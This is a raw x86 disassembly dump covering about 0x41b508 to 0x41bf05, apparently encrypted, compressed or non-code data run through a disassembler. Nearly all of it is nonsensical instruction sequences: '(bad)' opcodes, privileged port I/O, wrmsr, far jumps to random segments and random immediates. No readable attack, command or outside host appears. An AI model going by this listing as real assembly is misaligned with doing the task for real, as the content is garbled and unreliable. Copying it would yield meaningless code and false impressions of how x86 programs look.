  41b508:	(bad)  
  41b509:	mov    DWORD PTR [edx+ebp*8],esi
  41b50c:	retf   
  41b50d:	pushf  
  41b50e:	mov    DWORD PTR [ebp+0x0],edi
	...
  41b571:	add    BYTE PTR [eax],al
  41b573:	add    ah,dl
  41b575:	in     al,dx
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	jns    0x41b53e
  41b582:	dec    ebx
  41b583:	hlt    
  41b584:	sbb    BYTE PTR [edx],ah
  41b586:	add    DWORD PTR [eax],eax
  41b588:	add    al,0x1
  41b58a:	add    BYTE PTR [eax],al
  41b58c:	sub    al,0x6f
  41b58e:	dec    esi
  41b58f:	mov    WORD PTR [ecx-0x7f],cs
  41b592:	scas   eax,DWORD PTR es:[edi]
  41b593:	xchg   edi,eax
  41b594:	cld    
  41b595:	sub    ecx,edx
  41b597:	pusha  
  41b598:	dec    esi
  41b599:	fistp  QWORD PTR [ecx-0x252e7b53]
  41b59f:	mov    ds:0xb231ff1,al
  41b5a4:	or     BYTE PTR [esi+0x594fed82],al
  41b5aa:	xchg   ebp,eax
  41b5ab:	mov    WORD PTR ds:0x5c6066af,?
  41b5b1:	repz inc ebx
  41b5b3:	jns    0x41b612
  41b5b5:	out    0x44,eax
  41b5b7:	pop    ebp
  41b5b8:	test   eax,0x233fe117
  41b5bd:	cmp    ah,BYTE PTR [esi+0x7a659fb2]
  41b5c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5c4:	xchg   esp,eax
  41b5c5:	fisub  DWORD PTR [esi]
  41b5c7:	div    BYTE PTR [edx]
  41b5c9:	adc    al,0x41
  41b5cb:	(bad)  
  41b5cc:	popa   
  41b5cd:	dec    edx
  41b5ce:	lds    ebx,FWORD PTR [edi]
  41b5d0:	aas    
  41b5d1:	mov    esp,0xaec5112f
  41b5d6:	setae  ah
  41b5d9:	adc    ebp,eax
  41b5db:	(bad)  
  41b5dc:	push   gs
  41b5de:	aam    0x79
  41b5e0:	inc    esi
  41b5e1:	pop    edi
  41b5e2:	hlt    
  41b5e3:	adc    dl,dl
  41b5e5:	sbb    dl,dl
  41b5e7:	sub    DWORD PTR [ebx-0x7fbb05de],0x3a
  41b5ee:	imul   edi,DWORD PTR [edx+0x77],0x61da0e77
  41b5f5:	adc    esi,DWORD PTR [edi+ecx*8-0x10cd8f69]
  41b5fc:	stc    
  41b5fd:	int    0x25
  41b5ff:	or     ebx,DWORD PTR [eax-0x63]
  41b602:	imul   esp,DWORD PTR [edi],0x695760a5
  41b608:	pop    ebp
  41b609:	call   0xfe6d2438
  41b60e:	mov    BYTE PTR [ecx],ah
  41b610:	shr    DWORD PTR [ebp+edx*1-0x5f],0x45
  41b615:	mov    eax,ds:0x7f83693c
  41b61a:	adc    BYTE PTR [ecx+edi*1+0x707b37b1],ch
  41b621:	push   cs
  41b622:	push   ecx
  41b623:	xor    ebp,DWORD PTR [edi-0x68]
  41b626:	(bad)  
  41b627:	std    
  41b628:	add    DWORD PTR [edx-0x59df40c3],edi
  41b62e:	(bad)  
  41b62f:	sbb    ebp,DWORD PTR [eax+0x75]
  41b632:	and    esp,esp
  41b634:	mov    edx,gs
  41b636:	jle    0x41b5f4
  41b638:	loop   0x41b5cd
  41b63a:	loopne 0x41b683
  41b63c:	cs add eax,0x75131f6c
  41b642:	sahf   
  41b643:	push   ebx
  41b644:	repz leave 
  41b646:	pop    eax
  41b647:	mov    edx,0x2af3a19b
  41b64c:	mov    bl,0xf3
  41b64e:	dec    eax
  41b64f:	mov    ebp,0x5d056001
  41b654:	dec    edi
  41b655:	xchg   esp,eax
  41b656:	lods   eax,DWORD PTR ds:[esi]
  41b657:	imul   esp,DWORD PTR [ecx-0x30990205],0x2a7083e1
  41b661:	(bad)  [esi]
  41b663:	daa    
  41b664:	(bad)  
  41b665:	retf   0xa3e9
  41b668:	push   esp
  41b669:	add    al,0x77
  41b66b:	rcl    BYTE PTR [esi-0x3600e8b8],0xd
  41b672:	clc    
  41b673:	xchg   edi,eax
  41b674:	hlt    
  41b675:	es retf 
  41b677:	jp     0x41b6d0
  41b679:	paddw  mm5,QWORD PTR [ecx]
  41b67c:	rcr    ah,cl
  41b67e:	mov    eax,0xc540978e
  41b683:	sbb    al,0x42
  41b685:	push   esp
  41b686:	and    al,cl
  41b688:	out    0x1e,al
  41b68a:	ins    DWORD PTR es:[edi],dx
  41b68b:	clc    
  41b68c:	enter  0xd8b6,0x26
	...
  41b6f4:	test   al,0x63
  41b6f6:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b6fc:	sti    
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	and    dl,bh
  41b702:	inc    ecx
  41b703:	xchg   ecx,eax
  41b704:	sbb    al,0x23
  41b706:	add    DWORD PTR [eax],eax
  41b708:	add    al,0x1
  41b70a:	add    BYTE PTR [eax],al
  41b70c:	sbb    DWORD PTR [ecx],edi
  41b70e:	xor    DWORD PTR [esp+ecx*8-0x2e],esp
  41b712:	mov    al,ds:0xc036174e
  41b717:	mov    ds:0xe1256b64,al
  41b71c:	aad    0x6c
  41b71e:	xor    BYTE PTR [ebp+0x53],cl
  41b721:	ret    0x115b
  41b724:	sub    ecx,DWORD PTR [esp+edx*4-0x36fc1162]
  41b72b:	push   edi
  41b72c:	mov    cx,0x553
  41b730:	mov    ebp,0x8adb53fa
  41b735:	imul   ebp,DWORD PTR [esi+0x41],0x4eb85437
  41b73c:	and    BYTE PTR [eax+edi*4-0x6b],0xbe
  41b741:	out    dx,eax
  41b742:	push   edx
  41b743:	jb     0x41b726
  41b745:	stos   BYTE PTR es:[edi],al
  41b746:	dec    eax
  41b747:	mov    ds:0x36a5a96a,al
  41b74c:	retf   0xe7ad
  41b74f:	pop    ebp
  41b750:	mov    ds:0x8fc17a4,eax
  41b755:	and    BYTE PTR [edx+ebx*2],0x7f
  41b759:	push   0x5e
  41b75b:	call   0xe9a39796
  41b760:	mov    eax,ds:0xad27a6de
  41b765:	jae    0x41b7b3
  41b767:	cmp    eax,0x6e147086
  41b76c:	add    al,0xac
  41b76e:	xchg   edi,eax
  41b76f:	xchg   esp,eax
  41b770:	sar    BYTE PTR [edx-0x74],1
  41b773:	pop    ebx
  41b774:	das    
  41b775:	loopne 0x41b779
  41b777:	mov    bl,dl
  41b779:	shl    BYTE PTR [esi+0x3a096c9c],1
  41b77f:	int3   
  41b780:	stc    
  41b781:	jno    0x41b714
  41b783:	inc    ebp
  41b784:	fsub   st,st(4)
  41b786:	idiv   BYTE PTR [edi+0x41]
  41b789:	into   
  41b78a:	pop    ds
  41b78b:	retf   
  41b78c:	mov    esi,0x5bfc0ea1
  41b791:	clc    
  41b792:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b793:	add    al,0x8b
  41b795:	outs   dx,BYTE PTR ds:[esi]
  41b796:	data16 xor BYTE PTR [eax],0x89
  41b79a:	mov    cl,0xbb
  41b79c:	push   ecx
  41b79d:	neg    al
  41b79f:	loop   0x41b760
  41b7a1:	inc    eax
  41b7a2:	cld    
  41b7a3:	fsub   st(5),st
  41b7a5:	jmp    0xcc78:0xeab3eddc
  41b7ac:	leave  
  41b7ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7af:	stos   DWORD PTR es:[edi],eax
  41b7b0:	cmp    DWORD PTR [edi+0x5d],eax
  41b7b3:	mov    edx,0x6efc602e
  41b7b8:	mov    bh,0x31
  41b7ba:	repnz cmc 
  41b7bc:	mov    ch,cl
  41b7be:	adc    bh,BYTE PTR [esi-0x70]
  41b7c1:	in     eax,0x3a
  41b7c3:	stos   BYTE PTR es:[edi],al
  41b7c4:	and    DWORD PTR [esi],ebp
  41b7c6:	xchg   DWORD PTR [ebp+0x2858497],esp
  41b7cc:	push   DWORD PTR [ecx]
  41b7ce:	fs jmp 0x18fa:0x44a9649c
  41b7d6:	sbb    BYTE PTR [ebx+0x52],cl
  41b7d9:	call   FWORD PTR [esi-0x68]
  41b7dc:	fidivr WORD PTR [ebx+0x69c09f0f]
  41b7e2:	lods   al,BYTE PTR ds:[esi]
  41b7e3:	(bad)  
  41b7e4:	and    esp,DWORD PTR [esi+0x44a915]
  41b7ea:	push   esp
  41b7eb:	cli    
  41b7ec:	or     ah,BYTE PTR [eax+0x7b]
  41b7ef:	sbb    ebp,edi
  41b7f1:	adc    bl,BYTE PTR [eax]
  41b7f3:	push   0x7dd9a219
  41b7f8:	sbb    eax,0x11a9d8e
  41b7fd:	sbb    esp,edx
  41b7ff:	xchg   ecx,eax
  41b800:	push   edx
  41b801:	aad    0x3e
  41b803:	bound  ebx,QWORD PTR [esi-0x6]
  41b806:	addr16 and al,0xc2
  41b809:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b80a:	inc    eax
  41b80b:	js     0x41b7fe
  41b80d:	test   eax,0x8bd8
	...
  41b872:	add    BYTE PTR [eax],al
  41b874:	mov    bh,ah
  41b876:	(bad)  
  41b877:	dec    esi
  41b878:	idiv   DWORD PTR [edi-0x75]
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0xa8
  41b881:	or     al,0x4
  41b883:	pop    es
  41b884:	and    BYTE PTR [ecx+eax*1],ah
  41b887:	add    BYTE PTR [ecx+eax*1],al
  41b88a:	add    BYTE PTR [eax],al
  41b88c:	mov    esi,0x50ec8742
  41b891:	xchg   edx,eax
  41b892:	inc    ebx
  41b893:	call   0x963db57
  41b898:	xor    ebp,esi
  41b89a:	inc    edi
  41b89b:	gs imul esi,ebp,0x235530ea
  41b8a2:	pop    esp
  41b8a3:	pushf  
  41b8a4:	mov    al,0x3
  41b8a6:	pop    es
  41b8a7:	push   edi
  41b8a8:	int3   
  41b8a9:	mov    ebp,fs
  41b8ab:	fisubr WORD PTR [eax+eiz*8+0x29]
  41b8af:	std    
  41b8b0:	pop    edi
  41b8b1:	aam    0x7d
  41b8b3:	lods   al,BYTE PTR ds:[esi]
  41b8b4:	outs   dx,DWORD PTR ds:[esi]
  41b8b5:	push   esi
  41b8b6:	xchg   ebp,eax
  41b8b7:	(bad)  
  41b8b8:	pop    esp
  41b8b9:	mov    esi,0x6bc3cf76
  41b8be:	pop    edi
  41b8c0:	in     eax,dx
  41b8c1:	cmp    al,0x54
  41b8c3:	test   eax,0x52aa2e64
  41b8c8:	push   eax
  41b8c9:	daa    
  41b8ca:	jmp    0xc8fd:0x4ce81f6f
  41b8d1:	aas    
  41b8d2:	mov    ds:0x7ac37273,eax
  41b8d7:	pop    ss
  41b8d8:	fcmovne st,st(5)
  41b8da:	pushf  
  41b8db:	push   eax
  41b8dc:	and    eax,0xca78fb88
  41b8e1:	cmc    
  41b8e2:	and    al,BYTE PTR [edx-0x7d]
  41b8e5:	push   ecx
  41b8e6:	cmp    ch,BYTE PTR [edx-0x74a1223e]
  41b8ec:	ror    DWORD PTR [esi+0x18230b29],1
  41b8f2:	sti    
  41b8f3:	ret    
  41b8f4:	pop    edi
  41b8f5:	cli    
  41b8f6:	sti    
  41b8f7:	mov    ebp,?
  41b8f9:	mov    al,0x52
  41b8fb:	out    0x9d,al
  41b8fd:	jmp    0x683e2aea
  41b902:	repnz out 0x44,eax
  41b905:	shl    DWORD PTR [eax-0x186498b8],0xa7
  41b90c:	dec    ebx
  41b90d:	or     eax,0x160dfe63
  41b912:	ins    DWORD PTR es:[edi],dx
  41b913:	inc    ebx
  41b914:	ret    
  41b915:	sbb    eax,0x76819d8d
  41b91a:	ret    
  41b91b:	xchg   BYTE PTR [esi+0x40],dh
  41b91e:	loop   0x41b8ad
  41b920:	push   edx
  41b921:	lock pop es
  41b923:	addr16 icebp 
  41b925:	out    0xd6,eax
  41b927:	or     al,bl
  41b929:	sub    dh,dh
  41b92b:	test   eax,0xbfc5e94c
  41b930:	fidivr WORD PTR [ebx-0x135c505e]
  41b936:	lahf   
  41b937:	lods   al,BYTE PTR ds:[esi]
  41b938:	test   WORD PTR [esi],cx
  41b93b:	push   ds
  41b93c:	out    dx,al
  41b93d:	pop    esi
  41b93e:	(bad)  
  41b93f:	sbb    BYTE PTR [ebp+ebx*4-0x6e],bl
  41b943:	jae    0x41b9bc
  41b945:	aas    
  41b946:	sub    eax,0xf725b8ce
  41b94b:	mov    ecx,DWORD PTR [esi-0x6515e41b]
  41b951:	jmp    0x66880ee7
  41b956:	loopne 0x41b921
  41b958:	mov    dl,0x66
  41b95a:	ins    BYTE PTR es:[edi],dx
  41b95b:	sub    BYTE PTR ds:0xc2397d0d,ch
  41b961:	rcl    DWORD PTR fs:[edi+0x3d],0x98
  41b966:	sbb    esi,DWORD PTR [ecx-0x349e24ac]
  41b96c:	lea    edi,ds:0x8a82685d
  41b972:	wrmsr  
  41b974:	gs and al,0x16
  41b977:	sub    al,0xfa
  41b979:	mov    ch,0xa6
  41b97b:	shl    DWORD PTR [eax-0x2a3c46e5],1
  41b981:	jns    0x41b9da
  41b983:	push   ebx
  41b984:	fdivr  DWORD PTR ds:[edi]
  41b987:	add    al,0x0
  41b989:	adc    DWORD PTR [ecx],edi
  41b98b:	push   cs
  41b98c:	push   ebp
  41b98d:	or     al,BYTE PTR [ebx+eax*2+0x0]
	...
  41b9f1:	add    BYTE PTR [eax],al
  41b9f3:	add    bl,al
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	data16 sti 
  41ba02:	inc    esp
  41ba03:	inc    esp
  41ba04:	and    al,0x25
  41ba06:	add    DWORD PTR [eax],eax
  41ba08:	add    al,0x1
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	cmp    ebp,DWORD PTR [edx]
  41ba0e:	xchg   DWORD PTR [esi],ebx
  41ba10:	inc    edx
  41ba11:	cmp    ebp,DWORD PTR [ecx+esi*2]
  41ba14:	mov    ebx,0xc1cd29c6
  41ba19:	int3   
  41ba1a:	sti    
  41ba1b:	stos   BYTE PTR es:[edi],al
  41ba1c:	test   BYTE PTR [ecx+0x4],cl
  41ba1f:	push   ecx
  41ba20:	sbb    bl,cl
  41ba22:	icebp  
  41ba23:	dec    edi
  41ba24:	sbb    ecx,DWORD PTR [esi-0x76c6b0c5]
  41ba2a:	out    dx,al
  41ba2b:	pop    DWORD PTR [edx]
  41ba2d:	add    esi,edx
  41ba2f:	(bad)  
  41ba30:	not    ebx
  41ba32:	adc    ebp,DWORD PTR [edx]
  41ba34:	and    dl,cl
  41ba36:	cmp    ecx,DWORD PTR [ebx]
  41ba38:	jmp    0x9a69:0xa766cdaf
  41ba3f:	aad    0xc7
  41ba41:	test   DWORD PTR [esi+edi*8],ecx
  41ba44:	mov    ebx,0xb2ad5b4f
  41ba49:	ja     0x41ba75
  41ba4b:	push   esp
  41ba4c:	in     eax,0xbd
  41ba4e:	jno    0x41ba78
  41ba50:	mov    ds:0x9a902325,al
  41ba55:	das    
  41ba56:	mov    eax,0x80fa9a52
  41ba5b:	int3   
  41ba5c:	xchg   esi,eax
  41ba5d:	cwde   
  41ba5e:	jae    0x41bab4
  41ba60:	pop    ss
  41ba61:	add    eax,0x115937e1
  41ba66:	cdq    
  41ba67:	xchg   esp,eax
  41ba68:	sub    edx,DWORD PTR [eax-0x3dbbeaa8]
  41ba6e:	das    
  41ba6f:	or     BYTE PTR [eax-0x370361dc],ch
  41ba75:	xchg   esi,eax
  41ba76:	jbe    0x41ba0b
  41ba78:	inc    esp
  41ba79:	jecxz  0x41b9fb
  41ba7b:	mov    esi,DWORD PTR [edi-0xcd8e69f]
  41ba81:	xor    ebx,DWORD PTR [ebx]
  41ba83:	jo     0x41bb03
  41ba85:	(bad)  
  41ba86:	(bad)  
  41ba87:	cmp    cl,BYTE PTR [ecx-0x565021e3]
  41ba8d:	or     eax,0x9f78fc11
  41ba92:	add    eax,0xc33b032a
  41ba97:	push   edx
  41ba98:	ror    ecx,0x34
  41ba9b:	mov    eax,0x2c130511
  41baa0:	test   eax,0x83676dc2
  41baa5:	push   0x8a81081f
  41baaa:	into   
  41baab:	das    
  41baac:	sub    edx,DWORD PTR [ebp-0x62]
  41baaf:	cwde   
  41bab0:	xchg   ecx,eax
  41bab1:	cmp    bl,ch
  41bab3:	stos   DWORD PTR es:[edi],eax
  41bab4:	cmp    DWORD PTR [esi-0x54456faa],edi
  41baba:	dec    ebx
  41babb:	inc    edx
  41babc:	das    
  41babd:	(bad)
  41bac0:	cld    
  41bac1:	fbld   TBYTE PTR [edi]
  41bac3:	inc    di
  41bac5:	jecxz  0x41bac8
  41bac7:	add    ah,BYTE PTR [ecx+edx*8]
  41baca:	dec    DWORD PTR [ebp+0x5c]
  41bacd:	mov    edi,0xc8a05e9
  41bad2:	mov    edx,0x2e41240e
  41bad7:	test   BYTE PTR [ebx],dl
  41bad9:	imul   edx,DWORD PTR [edx],0xd889ffdf
  41badf:	in     eax,dx
  41bae0:	lahf   
  41bae1:	push   ss
  41bae2:	mov    cl,cl
  41bae4:	dec    ebp
  41bae5:	inc    ecx
  41bae6:	sub    al,0x2b
  41bae8:	dec    eax
  41bae9:	scas   al,BYTE PTR es:[edi]
  41baea:	stos   DWORD PTR es:[edi],eax
  41baeb:	test   al,0x7
  41baed:	loope  0x41baff
  41baef:	setl   BYTE PTR [eax+0x7675a688]
  41baf6:	es sbb eax,0x9c6c10e
  41bafc:	cmp    bl,BYTE PTR [ebp+0x9bcd93a]
  41bb02:	cli    
  41bb03:	enter  0x7001,0x5f
  41bb07:	std    
  41bb08:	aam    0x3e
  41bb0a:	mov    ch,0x3d
  41bb0c:	enter  0xae0,0x89
	...
  41bb74:	or     bh,BYTE PTR [eax-0x4048555b]
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0x24],cx
  41bb81:	pop    ds
  41bb82:	and    DWORD PTR [ebx],0x12628
  41bb88:	add    al,0x1
  41bb8a:	add    BYTE PTR [eax],al
  41bb8c:	lock jl 0x41bbb2
  41bb8f:	mov    edx,0x611461ea
  41bb94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb95:	xor    ebp,DWORD PTR [eax+ebp*4-0x58]
  41bb99:	loop   0x41bbca
  41bb9b:	out    0xf7,al
  41bb9d:	test   DWORD PTR [ebp-0x1a],ebp
  41bba0:	mov    ecx,0xf6d8ec8b
  41bba5:	rcl    BYTE PTR cs:[eax-0x3c],1
  41bba9:	pop    esi
  41bbaa:	mov    ebx,0xe3b4f504
  41bbaf:	sbb    DWORD PTR [ecx-0x6fecf6d5],0x7f
  41bbb6:	not    bh
  41bbb8:	les    eax,FWORD PTR [ebx]
  41bbba:	cmp    al,0x24
  41bbbc:	or     esi,DWORD PTR [edx*8+0x3332196d]
  41bbc3:	xchg   ecx,eax
  41bbc4:	inc    ecx
  41bbc5:	add    DWORD PTR [ebp+edi*8-0x5917e4f7],edi
  41bbcc:	pop    es
  41bbcd:	out    0x9a,al
  41bbcf:	mov    ebp,0xd12694ea
  41bbd4:	pop    edx
  41bbd5:	pop    ds
  41bbd6:	repz jge 0x41bc58
  41bbd9:	fiadd  WORD PTR [esi+edi*4+0x7cbaad67]
  41bbe0:	iret   
  41bbe1:	sbb    BYTE PTR [ebx],bl
  41bbe3:	and    al,0x71
  41bbe5:	cdq    
  41bbe6:	dec    ecx
  41bbe7:	sub    DWORD PTR [edi-0x2a045f59],ecx
  41bbed:	pop    esp
  41bbee:	inc    esp
  41bbef:	pusha  
  41bbf0:	and    dh,bl
  41bbf2:	mov    ch,0x2f
  41bbf4:	jmp    0x41bbd9
  41bbf6:	data16 (bad) 
  41bbf8:	push   edi
  41bbf9:	jne    0x41bc68
  41bbfb:	xlat   BYTE PTR es:[ebx]
  41bbfd:	jns    0x41bc62
  41bbff:	retf   0xb569
  41bc02:	adc    esp,edx
  41bc04:	xchg   ebx,eax
  41bc05:	retf   0xb342
  41bc08:	mov    al,BYTE PTR [edi-0x58]
  41bc0b:	jns    0x41bc3c
  41bc0d:	mov    BYTE PTR [edi],al
  41bc0f:	pop    edi
  41bc10:	cld    
  41bc11:	scas   al,BYTE PTR es:[edi]
  41bc12:	adc    DWORD PTR es:[ecx-0x58c9362],edi
  41bc19:	cs push ss
  41bc1b:	sahf   
  41bc1c:	int    0x24
  41bc1e:	inc    edi
  41bc1f:	div    BYTE PTR [ecx-0x1aec1cc2]
  41bc25:	sub    ah,dl
  41bc27:	inc    esi
  41bc28:	in     eax,dx
  41bc29:	andnps xmm1,XMMWORD PTR [edi-0x258f3305]
  41bc30:	std    
  41bc31:	adc    DWORD PTR [esi],0xba4001d9
  41bc37:	jg     0x41bcb5
  41bc39:	shr    DWORD PTR [edx],0x36
  41bc3c:	test   eax,0xaf18d80e
  41bc41:	sbb    al,0x47
  41bc43:	fwait
  41bc44:	mov    ebp,0xeb869fc6
  41bc49:	xor    DWORD PTR [eax-0x61],0xcea7a17e
  41bc50:	jecxz  0x41bbe0
  41bc52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc53:	xor    al,0x19
  41bc55:	ja     0x41bc66
  41bc57:	inc    ebp
  41bc58:	retf   
  41bc59:	repz rol BYTE PTR es:[edi],1
  41bc5d:	push   ebp
  41bc5e:	adc    cl,BYTE PTR [eax]
  41bc60:	shl    DWORD PTR [edi+0x15],1
  41bc63:	push   edi
  41bc64:	jbe    0x41bcda
  41bc66:	push   edi
  41bc67:	cmp    DWORD PTR [eax+0x41],ebp
  41bc6a:	pop    esi
  41bc6b:	les    edi,FWORD PTR [ebx]
  41bc6d:	mov    ebx,0xdc1a0ca7
  41bc72:	jg     0x41bce0
  41bc74:	xchg   edx,eax
  41bc75:	fcmovne st,st(4)
  41bc77:	cld    
  41bc78:	jb     0x41bc9b
  41bc7a:	popa   
  41bc7b:	pop    esp
  41bc7c:	mov    al,0xdb
  41bc7e:	inc    edx
  41bc7f:	sub    ebx,0xffffffbc
  41bc82:	mov    ds:0xbe50f25a,eax
  41bc87:	cs pop esi
  41bc89:	fcmovbe st,st(3)
  41bc8b:	add    bh,BYTE PTR ds:0xb313e2
	...
  41bcf1:	add    BYTE PTR [eax],al
  41bcf3:	add    dl,dl
  41bcf5:	xor    bh,dl
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x2bc4d9d8
  41bd02:	in     al,0x7a
  41bd04:	sub    al,0x27
  41bd06:	add    DWORD PTR [eax],eax
  41bd08:	add    al,0x1
  41bd0a:	add    BYTE PTR [eax],al
  41bd0c:	push   ebp
  41bd0d:	rcl    BYTE PTR [ecx+0x55],cl
  41bd10:	push   0xffffff91
  41bd12:	pop    ecx
  41bd13:	pop    ebp
  41bd14:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41bd16:	sar    ebx,cl
  41bd18:	mov    dl,0xa4
  41bd1a:	push   ds
  41bd1b:	je     0x41bd09
  41bd1d:	pop    edi
  41bd1e:	sbb    BYTE PTR ds:[edi-0x11445b5b],al
  41bd25:	cmp    al,0xa1
  41bd27:	fdivr  QWORD PTR [edx]
  41bd29:	or     DWORD PTR [edx-0x4b],ebp
  41bd2c:	dec    esp
  41bd2d:	lods   eax,DWORD PTR ds:[esi]
  41bd2e:	push   ebp
  41bd2f:	add    eax,0x4a8d0b0
  41bd34:	add    edi,DWORD PTR [ebp+0x39]
  41bd37:	(bad)  
  41bd38:	adc    edx,DWORD PTR [eax-0x9e9e6aa]
  41bd3e:	les    esp,FWORD PTR [ebx+eiz*1+0x38]
  41bd42:	or     esi,ebx
  41bd44:	sar    DWORD PTR [eax+0x2b],0x4a
  41bd48:	addr16 and al,0x7e
  41bd4b:	fwait
  41bd4c:	shl    ah,1
  41bd4e:	cmp    cl,al
  41bd50:	jmp    0xbb052f10
  41bd55:	pop    ebx
  41bd56:	outs   dx,BYTE PTR ds:[esi]
  41bd57:	jmp    0x41bd95
  41bd59:	push   ebx
  41bd5a:	mov    bl,0xa8
  41bd5c:	jmp    0x41bd50
  41bd5e:	mov    ds:0xab042f3c,eax
  41bd63:	test   al,0x2e
  41bd65:	adc    DWORD PTR [edx],0x8ffaad06
  41bd6b:	outs   dx,DWORD PTR ds:[esi]
  41bd6c:	xor    al,0x8d
  41bd6e:	sti    
  41bd6f:	ror    ebp,cl
  41bd71:	fcomi  st,st(3)
  41bd73:	push   esi
  41bd74:	sbb    BYTE PTR [eax],dl
  41bd76:	pop    ecx
  41bd77:	jecxz  0x41bd92
  41bd79:	mov    bx,0x3c68
  41bd7d:	inc    esi
  41bd7e:	fs dec ecx
  41bd80:	xchg   esi,eax
  41bd81:	pop    es
  41bd82:	fld    QWORD PTR [ebp+0x76]
  41bd85:	(bad)
  41bd88:	popa   
  41bd89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd8a:	ror    BYTE PTR [edi],0xb3
  41bd8d:	loope  0x41bd2e
  41bd8f:	cli    
  41bd90:	out    0xe9,eax
  41bd92:	fmul   st,st(3)
  41bd94:	in     al,dx
  41bd95:	mov    dl,0xfd
  41bd97:	mov    WORD PTR [ebx],?
  41bd99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd9a:	stos   BYTE PTR es:[edi],al
  41bd9b:	in     eax,dx
  41bd9c:	mov    ds:0x83a937f0,eax
  41bda1:	inc    ebx
  41bda2:	mov    eax,ds:0x4cf09bf9
  41bda7:	jb     0x41bdae
  41bda9:	xor    BYTE PTR [ecx],dl
  41bdab:	mov    esp,0xfd246fda
  41bdb0:	sub    ecx,DWORD PTR cs:[eax-0x66]
  41bdb4:	mov    BYTE PTR [edx+ecx*4+0x19],dl
  41bdb8:	mov    cl,0x4d
  41bdba:	lahf   
  41bdbb:	sbb    BYTE PTR [ecx+0x1b],0xa6
  41bdbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdc0:	adc    eax,0x105ca9dc
  41bdc5:	add    cl,al
  41bdc7:	add    DWORD PTR [ecx+0x26e4ce24],edx
  41bdcd:	push   edi
  41bdce:	ins    DWORD PTR es:[edi],dx
  41bdcf:	hlt    
  41bdd0:	arpl   di,ax
  41bdd2:	jmp    0x34d9:0xf3e6f159
  41bdd9:	or     ecx,DWORD PTR [edx-0x5aa51727]
  41bddf:	push   edx
  41bde0:	sbb    esi,DWORD PTR [ecx+0x55]
  41bde3:	jle    0x41bde1
  41bde5:	inc    ecx
  41bde6:	cmp    DWORD PTR [esi],ebx
  41bde8:	mov    edi,0x867be23c
  41bded:	retf   
  41bdee:	lods   eax,DWORD PTR ds:[esi]
  41bdef:	hlt    
  41bdf0:	sbb    al,0x9c
  41bdf2:	mov    ds:0x660cc86b,eax
  41bdf7:	shl    BYTE PTR [ecx],0xe3
  41bdfa:	lds    eax,FWORD PTR [eax]
  41bdfc:	push   ecx
  41bdfd:	loopne 0x41bdea
  41bdff:	loope  0x41bdc1
  41be01:	push   ss
  41be02:	xchg   edi,eax
  41be03:	lods   al,BYTE PTR ds:[esi]
  41be04:	(bad)  
  41be05:	test   BYTE PTR [edx+0x58],dl
  41be08:	xchg   ebp,eax
  41be09:	and    edx,ebp
  41be0b:	pop    ebp
  41be0c:	ds jp  0x41bdf8
  41be0f:	xor    BYTE PTR [eax],al
	...
  41be71:	add    BYTE PTR [eax],al
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx+0x69493f66]
  41be82:	shl    ecx,1
  41be84:	xor    BYTE PTR [eax],ch
  41be86:	add    DWORD PTR [eax],eax
  41be88:	add    al,0x1
  41be8a:	add    BYTE PTR [eax],al
  41be8c:	jp     0x41befd
  41be8e:	mov    ds:0x892e62ca,al
  41be93:	mov    ebx,0x8c484bfc
  41be98:	cmp    eax,0x529c0f0e
  41be9d:	xor    ah,dl
  41be9f:	or     BYTE PTR [ebp-0x510bfe8d],0x41
  41bea6:	pop    ecx
  41bea7:	xchg   esi,eax
  41bea8:	inc    esi
  41bea9:	or     eax,0x3dc03f22
  41beae:	add    esi,eax
  41beb0:	push   ss
  41beb1:	mov    ds:0xbe05ab4b,al
  41beb6:	ja     0x41be49
  41beb8:	and    ebp,DWORD PTR [bx]
  41bebb:	dec    esp
  41bebc:	mov    bl,0x74
  41bebe:	into   
  41bebf:	arpl   WORD PTR [edi-0x19e0e1b2],ax
  41bec5:	loop   0x41be90
  41bec7:	xor    esi,DWORD PTR [edi-0x3b25ce42]
  41becd:	or     ecx,DWORD PTR [edi]
  41becf:	ins    DWORD PTR es:[edi],dx
  41bed0:	leave  
  41bed1:	lods   al,BYTE PTR ds:[esi]
  41bed2:	lds    ecx,FWORD PTR [eax+0x26e889d5]
  41bed8:	xchg   ecx,eax
  41bed9:	push   0xe8d8a54e
  41bede:	jmp    0xdca234e3
  41bee3:	cmp    eax,0x3c97c8e4
  41bee8:	or     ebx,DWORD PTR [eax]
  41beea:	xor    edi,DWORD PTR [ebx]
  41beec:	dec    ebp
  41beed:	sub    DWORD PTR [ecx-0x66397473],edi
  41bef3:	pop    esi
  41bef4:	fld    TBYTE PTR [ecx+0x4f]
  41bef7:	ins    BYTE PTR es:[edi],dx
  41bef8:	(bad)  
  41befa:	cmp    BYTE PTR [eax-0x6e24f30],ch
  41bf00:	pop    ecx
  41bf01:	cmp    ecx,DWORD PTR [eax]
  41bf03:	xchg   ebx,eax
  41bf04:	lods   eax,DWORD PTR ds:[esi]
  41bf05:	xor    eax,0xd152775c
